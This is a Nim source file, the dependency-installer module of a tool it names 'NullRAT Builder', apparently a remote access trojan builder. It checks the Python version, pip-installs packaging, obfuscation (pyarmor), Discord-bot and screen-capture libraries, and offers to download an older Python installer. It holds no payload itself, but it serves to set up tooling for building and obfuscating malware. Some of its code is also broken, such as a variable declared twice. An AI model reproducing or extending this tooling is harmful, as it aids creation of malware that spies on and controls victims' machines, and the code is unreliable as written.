import std/terminal
import std/os
import std/osproc
import std/strutils
import std/streams
import puppy

from utils import cleanWorkingDir, printName

from variables import variablesCreator

const pipModules = ["pyinstaller", "virtualenv", "disnake", "requests", "pyarmor", "mss", "psutil"]
         
proc packageInstaller*() = 
    printName()
    stdout.styledWriteLine({styleBright}, "  >> Dependencies Installer <<")
    echo ""

    # Check Python version, pyarmor no longer supports 3.11+
    stdout.styledWriteLine({styleBright}, "[1] Checking for Python...")
    var status = execProcess("python --version")
    for i in ["3.11", "3.12", "3.13", "3.14"]:
        if i in status: 
            echo "[INFO] Python ", i, " is not supported!\n - Pyarmor only supports max python version of 3.10\n - Uninstall Python and run this program again to auto-download the correct version!"
            sleep(5000)
            quit(0)

    const modules: string = pipModules.join(" ")

    var status: int = execShellCmd("python --version")
    var status2: int = execShellCmd("py --version")

    if status == 0 or status2 == 0:
        stdout.styledWriteLine(fgGreen, {styleBright}, "- Python installed!")
        echo ""

        stdout.styledWriteLine({styleBright}, "[2] Checking if packages already installed...")
        var result = execCmdEx("dism")

        try:
            result = execCmdEx("pip freeze")
        except OSError:
            result = execCmdEx("py -m pip freeze")

        var allInstalled: bool = true

        if result.exitCode != 0:
            echo "[FATAL] pip command failed to execute!!"
            sleep(2000)
        else:
            for module in pipModules:
                if module notin result.output:
                    allInstalled = false
            
            if allInstalled:
                stdout.styledWriteLine(fgGreen, {styleBright}, "[INFO] All packages installed and detected!\n\nProceeding on with variables creation...")
                sleep(1000)
                variablesCreator(0)
            else:
                echo "[INFO] Dependencies are not installed!\n"
                stdout.styledWriteLine({styleBright}, "[3] Installing/Updating dependencies...")
                
                var result: int = 0
                
                result = execShellCmd("pip install " & modules)
                if result != 0:
                    result = execShellCmd("python -m pip install " & modules)
                    if result != 0:
                        result = execShellCmd("py -m pip install " & modules)

                if result == 0:
                    echo "========================"
                    stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
                    sleep(2000)
                    variablesCreator(0)
                else: 
                    echo "[FATAL] Unknown pip error, returning to main menu..."
                    sleep(3000)
    else:
        stdout.styledWriteLine({styleBright}, "- [FATAL] Python not installed!\n\nWould you like to download the recommended python installer? (Y/n): ")
        var input: char = getch()
        if input == 'N' or input == 'n':
            echo "[FATAL] NullRAT Builder cannot continue otherwise!!! Exiting in 5 seconds..."
            sleep(5000)
            quit(1)
        elif input == 'Q' or input == 'q': 
            return 
        else:
            stdout.styledWriteLine({styleBright}, "Downloading installer to current directory....")
            let response = get("http://www.python.org/ftp/python/3.8.10/python-3.8.10.exe", @[("Content-Type", "application/x-msdownload")])
            var strm = newFileStream("python-setup.exe", fmWrite)
            strm.write(response.body)
            strm.close()
            stdout.styledWriteLine(fgGreen, {styleBright}, "Downloaded! https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe")
            echo ""
            stdout.styledWriteLine({styleBright}, "After running, please tick 'Install for All Users'")
            stdout.styledWriteLine({styleBright}, "and 'Add Python 3.8 to PATH', then Install Now")
            stdout.styledWriteLine({styleBright}, "After installing, check if everything is functional")
            stdout.styledWriteLine({styleBright}, "by running NullRAT builder again.")
            echo ""
            stdout.styledWriteLine({styleBright}, "Returning to menu after installer is closed...")
            discard execCmdEx("python-setup.exe")
            return